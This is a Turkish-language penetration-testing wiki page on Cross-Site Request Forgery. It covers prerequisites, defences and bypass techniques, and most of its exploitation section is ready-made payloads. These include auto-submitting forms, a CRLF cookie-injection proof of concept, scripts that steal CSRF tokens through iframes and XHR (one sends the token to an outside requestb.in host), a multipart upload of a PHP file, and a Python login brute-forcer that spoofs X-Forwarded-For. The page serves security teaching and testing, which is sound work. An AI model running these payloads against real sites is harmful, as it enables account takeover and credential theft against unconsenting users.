# CSRF (Cross Site Request Forgery)

{{#include ../banners/hacktricks-training.md}}

## Cross-Site Request Forgery (CSRF) Açıklaması

**Cross-Site Request Forgery (CSRF)**, web uygulamalarında bulunan bir güvenlik açığı türüdür. Bu, saldırganların, kimlik doğrulama oturumlarını istismar ederek, habersiz kullanıcılar adına eylemler gerçekleştirmesine olanak tanır. Saldırı, bir kullanıcının, bir kurbanın platformuna giriş yaptıktan sonra kötü niyetli bir siteyi ziyaret etmesiyle gerçekleştirilir. Bu site, JavaScript çalıştırma, formları gönderme veya resimleri alma gibi yöntemlerle kurbanın hesabına istekler tetikler.

### CSRF Saldırısı için Ön Koşullar

CSRF açığını istismar etmek için birkaç koşulun sağlanması gerekir:

1. **Değerli Bir Eylemi Belirleme**: Saldırgan, kullanıcının şifresini, e-posta adresini değiştirmek veya yetkileri artırmak gibi istismar edilecek bir eylem bulmalıdır.
2. **Oturum Yönetimi**: Kullanıcının oturumu yalnızca çerezler veya HTTP Temel Kimlik Doğrulama başlığı aracılığıyla yönetilmelidir, çünkü diğer başlıklar bu amaçla manipüle edilemez.
3. **Tahmin Edilemez Parametrelerin Yokluğu**: İstek, tahmin edilemez parametreler içermemelidir, çünkü bunlar saldırıyı engelleyebilir.

### Hızlı Kontrol

İsteği **Burp'ta yakalayabilir** ve CSRF korumalarını kontrol edebilir, tarayıcıdan test etmek için **Fetch olarak Kopyala** seçeneğine tıklayarak isteği kontrol edebilirsiniz:

<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### CSRF'ye Karşı Savunma

CSRF saldırılarına karşı korunmak için birkaç önlem uygulanabilir:

- [**SameSite çerezleri**](hacking-with-cookies/#samesite): Bu özellik, tarayıcının çerezleri, çapraz site istekleriyle göndermesini engeller. [SameSite çerezleri hakkında daha fazla bilgi](hacking-with-cookies/#samesite).
- [**Çapraz kaynak paylaşımı**](cors-bypass.md): Kurban sitesinin CORS politikası, saldırının uygulanabilirliğini etkileyebilir, özellikle saldırı, kurban sitesinden yanıt okumayı gerektiriyorsa. [CORS atlatma hakkında bilgi edinin](cors-bypass.md).
- **Kullanıcı Doğrulaması**: Kullanıcının şifresini istemek veya bir captcha çözmek, kullanıcının niyetini doğrulayabilir.
- **Referans veya Kaynak Başlıklarını Kontrol Etme**: Bu başlıkların doğrulanması, isteklerin güvenilir kaynaklardan geldiğinden emin olmaya yardımcı olabilir. Ancak, URL'lerin dikkatlice hazırlanması, kötü uygulanmış kontrolleri atlatabilir, örneğin:
  - `http://mal.net?orig=http://example.com` kullanmak (URL güvenilir URL ile bitiyor)
  - `http://example.com.mal.net` kullanmak (URL güvenilir URL ile başlıyor)
- **Parametre İsimlerini Değiştirme**: POST veya GET isteklerindeki parametre isimlerini değiştirmek, otomatik saldırıları önlemeye yardımcı olabilir.
- **CSRF Token'ları**: Her oturumda benzersiz bir CSRF token'ı eklemek ve bu token'ı sonraki isteklere zorunlu kılmak, CSRF riskini önemli ölçüde azaltabilir. Token'ın etkinliği, CORS'un zorlanmasıyla artırılabilir.

Bu savunmaları anlamak ve uygulamak, web uygulamalarının güvenliğini ve bütünlüğünü korumak için kritik öneme sahiptir.

## Savunma Atlatma

### POST'tan GET'e

Kötüye kullanmak istediğiniz form, bir **CSRF token ile POST isteği gönderecek şekilde hazırlanmış olabilir**, ancak bir **GET** isteğinin de **geçerli olup olmadığını kontrol etmelisiniz** ve GET isteği gönderdiğinizde **CSRF token'ının hala doğrulandığını** kontrol etmelisiniz.

### Token Eksikliği

Uygulamalar, token'lar mevcut olduğunda **token'ları doğrulamak için bir mekanizma** uygulayabilir. Ancak, token yokken doğrulamanın tamamen atlanması durumunda bir güvenlik açığı ortaya çıkar. Saldırganlar, token'ı taşıyan **parametreyi kaldırarak** bunu istismar edebilir, sadece değerini değil. Bu, doğrulama sürecini atlatmalarına ve etkili bir Cross-Site Request Forgery (CSRF) saldırısı gerçekleştirmelerine olanak tanır.

### CSRF token'ı kullanıcı oturumuna bağlı değil

Uygulamalar **CSRF token'larını kullanıcı oturumlarına bağlamıyorsa**, bu önemli bir **güvenlik riski** oluşturur. Bu sistemler, her token'ın başlatan oturumla bağlı olmasını sağlamak yerine, token'ları **küresel bir havuz** ile doğrular.

Saldırganların bunu nasıl istismar ettiğine dair:

1. **Kendi hesaplarıyla kimlik doğrulama** yaparlar.
2. **Küresel havuzdan geçerli bir CSRF token'ı** alırlar.
3. **Bu token'ı** bir kurbana karşı CSRF saldırısında kullanırlar.

Bu güvenlik açığı, saldırganların kurban adına yetkisiz istekler yapmasına olanak tanır ve uygulamanın **yetersiz token doğrulama mekanizmasını** istismar eder.

### Yöntem atlatma

Eğer istek "**garip**" bir **yöntem** kullanıyorsa, **yöntem** **aşırı yükleme işlevselliğinin** çalışıp çalışmadığını kontrol edin. Örneğin, eğer **PUT** yöntemi kullanıyorsa, **POST** yöntemini kullanmayı deneyebilir ve **gönderebilirsiniz**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Bu, **\_method parametresini bir POST isteği içinde göndermek** veya **başlıkları** kullanarak da çalışabilir:

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### Özel başlık token atlatma

Eğer istek, **CSRF koruma yöntemi** olarak isteğe bir **token** ile **özel başlık** ekliyorsa, o zaman:

- **Özelleştirilmiş Token ve başlık olmadan isteği test edin.**
- **Tam aynı uzunlukta ama farklı bir token ile isteği test edin.**

### CSRF token'ı bir çereze bağlı olarak doğrulanıyor

Uygulamalar, token'ı hem bir çerezde hem de bir istek parametresinde kopyalayarak veya bir CSRF çerezi ayarlayarak ve arka uçta gönderilen token'ın çerezle eşleşip eşleşmediğini doğrulayarak CSRF koruması uygulayabilir. Uygulama, istek parametresindeki token'ın çerezdeki değerle uyumlu olup olmadığını kontrol ederek istekleri doğrular.

Ancak, bu yöntem, bir saldırganın kurbanın tarayıcısında bir CSRF çerezi ayarlamasına olanak tanıyan hatalar varsa CSRF saldırılarına karşı savunmasızdır, örneğin bir CRLF açığı. Saldırgan, çerezi ayarlayan yanıltıcı bir resmi yükleyerek bunu istismar edebilir ve ardından CSRF saldırısını başlatabilir.

Aşağıda bir saldırının nasıl yapılandırılabileceğine dair bir örnek bulunmaktadır:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input
type="hidden"
name="csrf"
value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img
src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
onerror="document.forms[0].submit();" />
</body>
</html>
```
> [!NOTE]
> **csrf token'in oturum çerezi ile ilişkili olması durumunda bu saldırı çalışmayacaktır** çünkü kurbanın oturumunu ayarlamanız gerekecek ve dolayısıyla kendinizi hedef almış olacaksınız.

### Content-Type değişikliği

[**bu**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) kaynağına göre, **POST** yöntemi kullanarak **ön uç** isteklerini önlemek için izin verilen Content-Type değerleri şunlardır:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

Ancak, kullanılan **Content-Type**'a bağlı olarak **sunucu mantığı değişebilir** bu nedenle belirtilen değerleri ve **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ gibi diğer değerleri denemelisiniz.

Örnek ( [buradan](https://brycec.me/posts/corctf_2021_challenges) ) JSON verisini text/plain olarak gönderme:
```html
<html>
<body>
<form
id="form"
method="post"
action="https://phpme.be.ax/"
enctype="text/plain">
<input
name='{"garbageeeee":"'
value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
</form>
<script>
form.submit()
</script>
</body>
</html>
```
### JSON Verileri için Ön Uç İsteklerini Aşma

JSON verilerini bir POST isteği ile göndermeye çalışırken, bir HTML formunda `Content-Type: application/json` kullanmak doğrudan mümkün değildir. Benzer şekilde, bu içerik türünü göndermek için `XMLHttpRequest` kullanmak bir ön uç isteği başlatır. Yine de, bu sınırlamayı aşmanın ve sunucunun JSON verilerini Content-Type'a bakılmaksızın işleyip işlemediğini kontrol etmenin stratejileri vardır:

1. **Alternatif İçerik Türlerini Kullanma**: Formda `enctype="text/plain"` ayarlayarak `Content-Type: text/plain` veya `Content-Type: application/x-www-form-urlencoded` kullanın. Bu yaklaşım, arka ucun içerik türüne bakılmaksızın verileri kullanıp kullanmadığını test eder.
2. **İçerik Türünü Değiştirme**: Sunucunun içeriği JSON olarak tanımasını sağlarken bir ön uç isteğinden kaçınmak için verileri `Content-Type: text/plain; application/json` ile gönderebilirsiniz. Bu, bir ön uç isteği tetiklemez ancak sunucu `application/json` kabul edecek şekilde yapılandırılmışsa doğru bir şekilde işlenebilir.
3. **SWF Flash Dosyası Kullanımı**: Daha az yaygın ama uygulanabilir bir yöntem, bu tür kısıtlamaları aşmak için bir SWF flash dosyası kullanmaktır. Bu tekniği daha derinlemesine anlamak için [bu gönderiye](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937) bakın.

### Referans / Kaynak kontrolünü aşma

**Referans başlığından kaçının**

Uygulamalar, 'Referer' başlığını yalnızca mevcut olduğunda doğrulayabilir. Bir tarayıcının bu başlığı göndermesini önlemek için aşağıdaki HTML meta etiketi kullanılabilir:
```xml
<meta name="referrer" content="never">
```
Bu, 'Referer' başlığının hariç tutulmasını sağlar ve bazı uygulamalardaki doğrulama kontrollerinin atlanmasına neden olabilir.

**Regexp atlamaları**

{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

Referrer'ın parametreler içinde göndereceği URL'deki sunucunun alan adını ayarlamak için şunları yapabilirsiniz:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head>
<meta name="referrer" content="unsafe-url" />
</head>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState(
"",
"",
"?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
)
document.forms[0].submit()
</script>
</body>
</html>
```
### **HEAD yöntemi atlatma**

[**Bu CTF yazısı**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) kısmında, [Oak'ın kaynak kodu](https://github.com/oakserver/oak/blob/main/router.ts#L281) ile bir yönlendiricinin **HEAD isteklerini GET istekleri olarak yanıtladığı** açıklanmaktadır; bu, Oak'a özgü olmayan yaygın bir geçici çözümdür. HEAD istekleriyle ilgilenen belirli bir işleyici yerine, bunlar basitçe **GET işleyicisine verilir, ancak uygulama yanıt gövdesini kaldırır**.

Bu nedenle, bir GET isteği sınırlıysa, **GET isteği olarak işlenecek bir HEAD isteği gönderebilirsiniz**.

## **Sömürü Örnekleri**

### **CSRF Token'ı Sızdırma**

Eğer bir **CSRF token'ı** **savunma** olarak kullanılıyorsa, bir [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) açığını veya bir [**Dangling Markup**](dangling-markup-html-scriptless-injection/) açığını kullanarak **sızdırmayı** deneyebilirsiniz.

### **HTML etiketleri kullanarak GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Diğer HTML5 etiketleri, otomatik olarak bir GET isteği göndermek için kullanılabilir:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
<video src="...">
<source src="..." type="..." />
<video poster="...">
<link rel="stylesheet" href="..." />
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body {
background: url("...");
}
</style>
<bgsound src="...">
<track src="..." kind="subtitles" />
<input type="image" src="..." alt="Submit Button"
/></bgsound>
</body>
</object>
</video>
</video>
</audio>
```
### Form GET isteği
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### Form POST isteği
```html
<html>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
method="POST"
action="https://victim.net/email/change-email"
id="csrfform">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src="x" onerror="csrfform.submit();" />
<!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit() //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframe üzerinden Form POST isteği
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### **Ajax POST isteği**
```html
<script>
var xh
if (window.XMLHttpRequest) {
// code for IE7+, Firefox, Chrome, Opera, Safari
xh = new XMLHttpRequest()
} else {
// code for IE6, IE5
xh = new ActiveXObject("Microsoft.XMLHTTP")
}
xh.withCredentials = true
xh.open(
"POST",
"http://challenge01.root-me.org/web-client/ch22/?action=profile"
)
xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded") //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on")
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2",
})
</script>
```
### multipart/form-data POST isteği
```javascript
myFormData = new FormData()
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
myFormData.append("newAttachment", blob, "pwned.php")
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: { "Content-Type": "application/x-www-form-urlencoded" },
mode: "no-cors",
})
```
### multipart/form-data POST isteği v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest()
xhr.withCredentials = true
xhr.open("POST", url, true)
//  MIME POST request.
xhr.setRequestHeader(
"Content-Type",
"multipart/form-data, boundary=" + boundary
)
xhr.setRequestHeader("Content-Length", fileSize)
var body = "--" + boundary + "\r\n"
body +=
'Content-Disposition: form-data; name="' +
nameVar +
'"; filename="' +
fileName +
'"\r\n'
body += "Content-Type: " + ctype + "\r\n\r\n"
body += fileData + "\r\n"
body += "--" + boundary + "--"

//xhr.send(body);
xhr.sendAsBinary(body)
```
### Bir iframe içinden Form POST isteği
```html
<--! expl.html -->

<body onload="envia()">
<form
method="POST"
id="formulario"
action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva" />
</form>
<body>
<script>
function envia() {
document.getElementById("formulario").submit()
}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
</body>
</body>
```
### **CSRF Token'ı Çal ve POST isteği gönder**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest()
xhr.open("POST", POST_URL, true)
xhr.withCredentials = true

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

// This is for debugging and can be removed
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
var xhr = new XMLHttpRequest()
// This tels it to return it as a HTML document
xhr.responseType = "document"
xhr.withCredentials = true
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true)
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token")
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value)
}
}
// Make the request
xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```
### **CSRF Token'ı çal ve bir iframe, bir form ve Ajax kullanarak bir Post isteği gönder**
```html
<form
id="form1"
action="http://google.com?param=VALUE"
method="post"
enctype="multipart/form-data">
<input type="text" name="username" value="AA" />
<input type="checkbox" name="status" checked="checked" />
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1() {
x1 = document.getElementById("i1")
x1d = x1.contentWindow || x1.contentDocument
t = x1d.document.getElementById("token").value

document.getElementById("token").value = t
document.getElementById("form1").submit()
}
</script>
<iframe
id="i1"
style="display:none"
src="http://google.com?param=VALUE"
onload="javascript:f1();"></iframe>
```
### **CSRF Token'ı Çal ve bir iframe ile bir form kullanarak POST isteği gönder**
```html
<iframe
id="iframe"
src="http://google.com?param=VALUE"
width="500"
height="500"
onload="read()"></iframe>

<script>
function read() {
var name = "admin2"
var token =
document.getElementById("iframe").contentDocument.forms[0].token.value
document.writeln(
'<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
)
document.writeln(
'<input id="username" type="text" name="username" value="' +
name +
'" /><br />'
)
document.writeln(
'<input id="token" type="hidden" name="token" value="' + token + '" />'
)
document.writeln(
'<input type="submit" name="submit" value="Submit" /><br/>'
)
document.writeln("</form>")
document.forms[0].submit.click()
}
</script>
```
### **Token'ı çal ve 2 iframe kullanarak gönder**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTAjax ile CSRF token'ını çal ve bir form ile post gönder**
```html
<body onload="getData()">
<form
id="form"
action="http://google.com?param=VALUE"
method="POST"
enctype="multipart/form-data">
<input type="hidden" name="username" value="root" />
<input type="hidden" name="status" value="on" />
<input type="hidden" id="findtoken" name="token" value="" />
<input type="submit" value="valider" />
</form>

<script>
var x = new XMLHttpRequest()
function getData() {
x.withCredentials = true
x.open("GET", "http://google.com?param=VALUE", true)
x.send(null)
}
x.onreadystatechange = function () {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1]
document.getElementById("findtoken").value = token
document.getElementById("form").submit()
}
}
</script>
</body>
```
### Socket.IO ile CSRF
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io("http://six.jh2i.com:50022/test")

const username = "admin"

socket.on("connect", () => {
console.log("connected!")
socket.emit("join", {
room: username,
})
socket.emit("my_room_event", {
data: "!flag",
room: username,
})
})
</script>
```
## CSRF Giriş Kaba Kuvvet

Kod, bir CSRF token kullanarak bir giriş formunu Kaba Kuvvet ile kırmak için kullanılabilir (Ayrıca, olası bir IP kara listesini aşmaya çalışmak için X-Forwarded-For başlığını da kullanıyor):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Araçlar <a href="#tools" id="tools"></a>

- [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
- [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referanslar

- [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
- [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

{{#include ../banners/hacktricks-training.md}}
